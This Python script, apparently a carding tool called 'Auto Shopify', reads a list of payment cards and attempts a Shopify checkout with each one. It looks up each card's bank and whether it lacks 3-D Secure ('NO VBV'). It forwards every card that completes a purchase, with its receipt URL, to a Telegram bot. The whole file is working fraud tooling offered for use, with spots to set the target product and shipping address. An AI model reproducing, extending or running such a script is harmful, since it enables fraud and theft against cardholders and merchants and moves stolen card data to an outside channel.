from api import voidex, console
import os
def is_card_3d(status):
    if status in ['authenticate_attempt_successful', 'authenticate_successful']:

        return f"NO VBV ✅ ({status})"
    
    elif status == '':
        return 'Unknown ❌'
    else:
        return f"VBV ❌ ({status})"
    
def main():

    console.session_name = "Auto Shopify"

    filename = voidex.get_filename()

    if not os.path.exists(filename):
        console.error(f"No file exists with name '{filename}'")
        return
    
    with open(filename, "r", encoding="utf-8") as file:
        cardData = file.read()

    listas = voidex.create_lista_(cardData)
    if not listas:
        console.error("No cards found in {fln}".format(fln=filename))
        return
    
    console.info(f"Found {len(listas)} cards in {filename}")

    ## set shopify product here
    product_url = None
    email = None
    is_shippable = True # set True if the product is available for shipping
    ship_address = None # set None it will picked up a random address

    # or set custom shipping address 
    # ship_address = {
    #         "address1": "Colorado Springs Airport (COS)",
    #         "city": "Colorado Springs",
    #         "zonecode": "CO",
    #         "zipcode": "80916",
    # }
    
    for card in listas:

        console.info(f"Processing card: {card}")

        response = voidex.shopify_graphql_(product_url, card, email, is_shippable, ship_address)
        bin_data = voidex.vbv_lookup(card)
        # print(bin_data)
        vbv_status = bin_data.get('vbv_status', '')
        vbv_status = is_card_3d(vbv_status)

        # check if vbv lookup is failed 
        if bin_data.get('error'):
            bin_data = response.get('bin_data')
        
        # print(bin_data)

        bin_info = ""
        if bin_data:
            bin_info = f"| BIN Info: {bin_data['bank']} - {bin_data['country']}"
        
        state =  response.get('status', '')
        if state == 'ProcessedReceipt':
            receipt_url = response.get('receipt_url')
            success_msg = response.get('message', 'Payment completed')
            console.success(f" {card} | <green> {success_msg} </green> {bin_info} | VBV Status: {vbv_status}")

            # send telegram message here
            if voidex.chat_id and voidex.bot_token:
                forward_data = (
                    f"*Card*: `{card}`\n"
                    f"*Status*: {success_msg} ✅\n"
                    f"*Receipt URL*: `{receipt_url}`\n"
                    f"*Bin Info*: {bin_info}\n"
                    f"*VBV Status*: `{vbv_status}`"
                )
                voidex._forwarder(forward_data)

            print(receipt_url)
        else:
            error = response.get('error', 'Unknown Error')
            console.warning(f" {card} | <red> {error} </red> {bin_info} | VBV Status: {vbv_status}")
    
    print("\n\nFinished!")


if __name__ == "__main__":
    main()